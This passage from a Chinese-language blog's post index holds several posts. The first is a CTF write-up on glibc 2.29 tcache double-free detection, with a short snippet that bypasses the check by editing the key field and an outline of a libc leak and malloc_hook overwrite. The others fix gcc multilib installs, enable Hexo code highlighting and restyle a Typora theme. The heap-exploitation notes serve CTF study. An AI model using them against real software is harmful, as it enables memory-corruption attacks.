0x0000562fcfd39260</code>,记录的就是0x70大小chunk的首地址。</p>\n<blockquote>\n<p>喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/20gx 0x56533012f250</span><br><span class=\"line\">0x56533012f250:\t0x0000000000000000\t0x0000000000000071</span><br><span class=\"line\">0x56533012f260:\t0x0000000000000000\t0x000056533012f010</span><br></pre></td></tr></table></figure>\n\n<p>我们到Tcache的地址中看一看，会发现<code>0x56533012f260:    0x0000000000000000    0x000056533012f010</code>处的<code>0x000056533012f010</code>，这是一个key值。</p>\n<h4 id=\"2-29下Tcahce-double-free的检测\"><a href=\"#2-29下Tcahce-double-free的检测\" class=\"headerlink\" title=\"2.29下Tcahce double free的检测\"></a>2.29下Tcahce double free的检测</h4><p>之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是</p>\n<p>对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> *<span class=\"title\">next</span>;</span>  <span class=\"comment\">//链表指针，对应chunk中的fd字段</span></span><br><span class=\"line\">  <span class=\"comment\">/* This field exists to detect double frees.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span> *<span class=\"title\">key</span>;</span>  <span class=\"comment\">//指向所属的tcache结构体，对应chunk中的bk字段</span></span><br><span class=\"line\">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>也就是所谓的key对应的就是chunk的bk字段。</p>\n<p>当chunk被free，放入Tcache链表时，操作如下。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> __always_inline <span class=\"keyword\">void</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">tcache_put</span><span class=\"params\">(mchunkptr chunk, <span class=\"keyword\">size_t</span> tc_idx)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class=\"line\"><span class=\"comment\">     detect a double free.  */</span></span><br><span class=\"line\">  e-&gt;key = tcache;  <span class=\"comment\">//设置所属的tcache</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class=\"comment\">//单链表头插法</span></span><br><span class=\"line\">  tcache-&gt;entries[tc_idx] = e;  </span><br><span class=\"line\"> </span><br><span class=\"line\">  ++(tcache-&gt;counts[tc_idx]); <span class=\"comment\">//计数增加</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后进行free操作</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">size_t</span> tc_idx = csize2tidx(size);</span><br><span class=\"line\"><span class=\"comment\">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (tcache != <span class=\"literal\">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class=\"line\">  tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span></span><br><span class=\"line\"><span class=\"comment\">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span></span><br><span class=\"line\"><span class=\"comment\">  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class=\"comment\">//剪枝</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    tcache_entry *tmp;</span><br><span class=\"line\">    LIBC_PROBE(memory_tcache_double_free, <span class=\"number\">2</span>, e, tc_idx);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (tmp == e)</span><br><span class=\"line\">        malloc_printerr(<span class=\"string\">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class=\"comment\">//通过检查，放入tcahce中</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    tcache_put(p, tc_idx);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。</p>\n<p>大致是</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x78</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p>再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。</p>\n<p>然后我们需要构造出unsortedbin chunk、</p>\n<p>但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。</p>\n<p>那么有什么办法能构造出unsortedbin呢？<br>回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？</p>\n<p>如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？</p>\n<p>然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。</p>\n<p>总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。</p>\n<p>然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。</p>\n<h4 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h4><p>接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。</p>\n<p>但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。</p>\n<h3 id=\"Tcache-利用\"><a href=\"#Tcache-利用\" class=\"headerlink\" title=\"Tcache 利用\"></a>Tcache 利用</h3><p>不是学习不是学习不是学习，</p>\n<p>例题是lctf2018的easyheap。</p>\n<h4 id=\"漏洞点\"><a href=\"#漏洞点\" class=\"headerlink\" title=\"漏洞点\"></a>漏洞点</h4><p>一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。</p>\n<p>然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> __int64 __fastcall <span class=\"title\">sub_BEC</span><span class=\"params\">(_BYTE *a1, <span class=\"keyword\">int</span> a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, &amp;a1[v3], <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( a2 - <span class=\"number\">1</span> &lt; (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)v3 || !a1[v3] || a1[v3] == <span class=\"number\">10</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    a1[v3] = <span class=\"number\">0</span>;</span><br><span class=\"line\">    a1[a2] = <span class=\"number\">0</span>;<span class=\"comment\">//loophole</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *a1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。</p>\n<p>在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。</p>\n<p>包括ciscn lonelywolf也是利用到了这一点。</p>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><p><a href=\"https://blog.csdn.net/A951860555/article/details/116910945\">2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分</a></p>\n<p><a href=\"https://blog.csdn.net/chennbnbnb/article/details/109284780\">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1Sy4y1W7h2\">CISCN2021 lonelywolf</a></p>\n","categories":["HEAP - Tcache"],"tags":["Heap"]},{"title":"解决gcc无法编译32位程序的问题","url":"/2021/10/27/%E8%A7%A3%E5%86%B3gcc%E6%97%A0%E6%B3%95%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-FLCZyZTo\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"1）前言\"><a href=\"#1）前言\" class=\"headerlink\" title=\"1）前言\"></a>1）前言</h3><p>​    之前一直被gcc无法编译32位程序而困扰，但是问题一直拖着没有解决，趁着今天比较闲，把这个问题彻底解决一下。</p>\n<h3 id=\"2-过程\"><a href=\"#2-过程\" class=\"headerlink\" title=\"2)过程\"></a>2)过程</h3><p>​    首先我们尝试编译32位程序，gcc报错：<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.29.31.png\" alt=\"截屏2021-10-27 下午8.29.31\"></p>\n<p>​    缺少头文件，实则是没有安装多架构gcc。</p>\n<p>​    试图安装，失败，报错如下：<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.30.23.png\" alt=\"截屏2021-10-27 下午8.30.23\"></p>\n<p>​    这里有个坑了我好久的东西，就是这个报错</p>\n<p>E: Unable to correct problems, you have held broken packages.</p>\n<p>​    无法修正问题，你持有held broken的软件包。</p>\n<p>​    我一直没有理解正确这个held的意思，我以为是持有的意思，所以一直以来这句话在我眼中的意思是，你已经有这个软件包了，但是你不能安装。</p>\n<p>​    但实际上，但凡熟悉过apt或者dkpg的一些命令，或者但凡对linux文件系统稍微熟悉一点都知道其实hold是为了防止更新不想更新的软件包，而特殊设置的功能。通过apt- mark或者dpkg命令 ，从apt-get中将特定的软件包的更新排除。而这道题的报错就是源于这点–gcc-7-multilib等依赖的软件包版本不对，但是由于held，所以并没有被更新。</p>\n<p>​    但是通过<code>dpkg --get-selections | grep hold</code>指令查找held的软件包，并没有任何结果。</p>\n<p>​    经过各种试错，找到了一个快速解决的方法。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo aptitude install gcc-multilib</span><br></pre></td></tr></table></figure>\n\n<p><code> aptitude</code>与apt类似，也是包管理器。但是通过<code>aptitude</code>进行包管理，对于软件包依赖问题的处理更加细节。</p>\n<p>​    下面是一些常用的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">aptitude update <span class=\"comment\">#更新可用的包列表</span></span><br><span class=\"line\">aptitude purge &lt;pkgname&gt; <span class=\"comment\">#删除包及其配置文件</span></span><br><span class=\"line\">aptitude search &lt;pkgname&gt; <span class=\"comment\">#搜索包</span></span><br><span class=\"line\">aptitude clean <span class=\"comment\">#删除下载的包文件</span></span><br><span class=\"line\">aptitude autoclean <span class=\"comment\">#删除过期的包文件</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p><code> aptitude</code>执行起来和<code>apt</code>其实不太一样，比如    <code>sudo aptitude install gcc-multilib </code>这个命令其实执行起来长这样：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8810.58.52.png\" alt=\"截屏2021-10-27 下午10.58.52\"></p>\n<p>​    然后<code>aptitude</code>会问你</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png\" alt=\"截屏2021-10-27 下午11.00.00\"></p>\n<p>​    这里是最大的坑。如果是像我这种不想看英文按照习惯输Y的人，这里会踩一个大坑。</p>\n<p>​    明确地告诉了我：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">The following actions will resolve these dependencies:</span><br><span class=\"line\"></span><br><span class=\"line\">      Keep the following packages at their current version:</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      Accept this solution? [Y/n/q/?] </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>保持下面软件包的版本不变，你接受这个解决方式吗？</p>\n<p>显然我不接受，只要摁下N，问题就解决了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png\"></p>\n<p>然后。自动执行gdb-multilib的安装。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211027230403989.png\" alt=\"image-20211027230403989\"></p>\n<p>问题解决。</p>\n<h3 id=\"3）总结\"><a href=\"#3）总结\" class=\"headerlink\" title=\"3）总结\"></a>3）总结</h3><p>​    这个问题回过头来想，其实非常简单，如果清楚问题所在的话，只需要一行命令就能解决。当然并不是每个人都经验丰富，但是没有经验，可以积累经验，然而在积累的过程中，有些愚蠢的错误确实是不应该犯的。比如说，不认真看报错信息，或者提示，凭着感觉装。这是我在处理这种问题上最大的弱点。</p>\n<p>​    一个原因是我骄傲自满了，我确实认为在这一步不会出错，但是实际上问题就是发生在这一步上，另外就是，全英文的屏显，没有人愿意仔细阅读，但是这点没有办法，绝对不可能调成中文，这里只能是说，慢慢看，仔细看 ，然后提升一下英语水平。（但是有一说一，英语母语的人可能都不愿意看吧）</p>\n<h3 id=\"4）参考\"><a href=\"#4）参考\" class=\"headerlink\" title=\"4）参考\"></a>4）参考</h3><p><a href=\"https://blog.csdn.net/White_Idiot/article/details/58348957\">【Ubuntu】aptitude命令详解</a></p>\n<p><a href=\"https://askubuntu.com/questions/223237/unable-to-correct-problems-you-have-held-broken-packages\">Unable to correct problems, you have held broken packages</a></p>\n","categories":["MESS"],"tags":["linux primary"]},{"title":"解决hexo无法显示高亮问题","url":"/2021/10/28/%E8%A7%A3%E5%86%B3hexo%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E9%AB%98%E4%BA%AE%E9%97%AE%E9%A2%98/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>  \n    <div id=\"aplayer-WwQNaWvn\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>  博客搭了有快一年了，一直是hexo+git page的配置（不过这个搭配现在绝版了2333），但是一直荒废着，差不多到大一暑假的时候才想起要好好经营。</p>\n<p>​    但是代码高亮这个一直没有解决。</p>\n<p>​    之前我以为是博客主题配置的问题（就是highlight对象的值的问题），但是无论用怎么样的方法都不太行。</p>\n<p>​    在研究代码高亮的过程中，我才知道原来有个项目叫highlight.js,里面有各种各样的代码高亮的css文件。</p>\n<p>​    一开始我是将博客原本的代码高亮的css文件替换成我想要的样式，但是无论替换成什么样式，博客中代码都是蓝色，清一色的蓝色。然后我意识到，这根本不是什么代码高亮的样式，这根本就是，没有代码高亮。</p>\n<p>​    然后我开始在网上寻找解决方案，搜索的关键词是hexo 无法显示代码高亮，辗转来回，找到了一篇文章。</p>\n<p>​    <a href=\"https://igeek.cloud/2021/01/13/hexo%E4%B8%ADhighlight-js%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%9A%84%E4%BF%AE%E6%94%B9%E6%96%B9%E6%B3%95/\">hexo中highlight.js代码高亮的修改方法</a></p>\n<p>​    按照文章中的方法，我在主题layout文件夹中的_post.ejs文件随便找了个角落，把</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">COPY<span class=\"comment\">&lt;!-- Highlight.js --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;stylesheet&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">href</span>=<span class=\"string\">&quot;//highlightjs.org/static/demo/styles/night-owl.css&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    hljs.initHighlightingOnLoad();</span><br><span class=\"line\">&lt;/script</span><br></pre></td></tr></table></figure>\n\n<p>丢了进去。</p>\n<p>​    然后我的博客就成功的显示了代码高亮。</p>\n<p>​    这样看其实看不出什么端倪，具体功能的实现还是要看脚本的内容，但是估计我也看不懂（）。</p>\n<p>​    </p>\n","categories":["MESS"],"tags":["mess"]},{"title":"typora主题配置的一些心得","url":"/2021/10/29/typora%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-LmdLKtHl\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h4 id=\"1）\"><a href=\"#1）\" class=\"headerlink\" title=\"1）\"></a>1）</h4><p>​    由于看腻了typora原主题的python高亮的丑兮兮的屎黄色注释，决定换个主题。然而找遍整个主题列表，并没有我看得上的主题。本来打算作罢，但想起最近因为写小程序，学了一些简单的css，是不是可以尝试一下修改某些主题的css文件，打造一个自己喜欢的主题捏。</p>\n<h4 id=\"2）\"><a href=\"#2）\" class=\"headerlink\" title=\"2）\"></a>2）</h4><p>​    在下载主题的过程中我大致了解了一下typora主题开发的大致内容，其实主体感觉就是css（除了css，就是各种需要的字体。</p>\n<p>​    这里以主题<code>mint</code>为例，css中<code>:root</code>元素声明了全局css变量，如下：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"selector-pseudo\">:root</span> &#123;</span><br><span class=\"line\">  --side-bar-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#ffffff</span>;//边栏颜色</span><br><span class=\"line\">\t--control-text-<span class=\"attribute\">color</span>: <span class=\"number\">#6B6B6B</span>;//边栏文件未选中字体颜色</span><br><span class=\"line\">\t--active-file-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#ecf6f2</span>;//边栏文件背景颜色</span><br><span class=\"line\">\t--active-file-<span class=\"attribute\">border-color</span>: <span class=\"number\">#6B6B6B</span>;//不清楚是个啥</span><br><span class=\"line\">\t--active-file-text-<span class=\"attribute\">color</span>: <span class=\"number\">#202020</span>;//边栏文件选中后字体颜色</span><br><span class=\"line\">\t--<span class=\"selector-tag\">table</span>-even-row-<span class=\"attribute\">color</span>:<span class=\"number\">#f8fcfa</span>;//不清楚是个啥</span><br><span class=\"line\">\t--<span class=\"selector-tag\">table</span>-head-<span class=\"attribute\">color</span>:<span class=\"number\">#d9ede5</span>;//不清楚是个啥</span><br><span class=\"line\">\t--deep-theme-<span class=\"attribute\">color</span>: <span class=\"number\">#c2e2d5</span>;//深色模式主题色</span><br><span class=\"line\">\t--<span class=\"selector-tag\">code</span>-block-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#0F111A</span>;//代码块字体颜色以及代码块边框颜色</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    所以如果想修改各种配色，只需要修改对应颜色的hex就行。</p>\n<p>​    这个比较难搞的是猜测各种元素对应的含义（（需要手动去尝试。但是就算是这样还是有几个元素没有试出来到底是哪一块的配色，似乎typora也没有类似的官方文档来规定每个div的名字（（</p>\n<p>​    然后需要修改的是代码高亮的一些相关配色，typora的代码高亮是直接用的css而不是引用<code>highlight.js</code>（感觉也差不多233）。</p>\n<p>​    然后我们找到代码高亮的css元素（其他的基本都是字体以及留白的一些样式，没有需求可以不用管）,找到对应的元素就可以开始魔改（</p>\n<p>​    (ps:感觉typora还有很多主题的方法可以使用，比如说backgroud = url（），通过这个 插入图片等，但是好像并没有找到类似的文档，我也不想再切图，于是作罢)</p>\n<p>​    其实魔改以后感觉变化也不是特别大，但是魔改的过程还是很有意思。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-30%20%E4%B8%8B%E5%8D%882.46.50.png\" alt=\"截屏2021-10-30 下午2.46.50\"></p>\n<p>​        顺便附上它的css</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"selector-pseudo\">:root</span> &#123;</span><br><span class=\"line\">    --side-bar-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">\t--control-text-<span class=\"attribute\">color</span>: <span class=\"number\">#424242</span>;</span><br><span class=\"line\">\t--active-file-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">\t--active-file-<span class=\"attribute\">border-color</span>: <span class=\"number\">#6B6B6B</span>;</span><br><span class=\"line\">\t--active-file-text-<span class=\"attribute\">color</span>: <span class=\"number\">#7eadad</span>;</span><br><span class=\"line\">\t--<span class=\"selector-tag\">table</span>-even-row-<span class=\"attribute\">color</span>:<span class=\"number\">#555555</span>;</span><br><span class=\"line\">\t--<span class=\"selector-tag\">table</span>-head-<span class=\"attribute\">color</span>:<span class=\"number\">#7a7979</span>;</span><br><span class=\"line\">\t--deep-theme-<span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;</span><br><span class=\"line\">\t--<span class=\"selector-tag\">code</span>-block-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#292424</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*serif*/</span></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/Lexend-Regular.ttf&#x27;</span>) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: bold;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/Lexend-Bold.ttf&#x27;</span>) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*monospace*/</span></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;SourceCodePro&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">local</span>(SourceCodePro), <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/SourceCodePro-Regular.ttf&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*Chinese*/</span></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;NotoSansSC&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/NotoSansSC-Regular.otf&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;NotoSansSC&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: bold;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/NotoSansSC-Bold.otf&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">html</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> 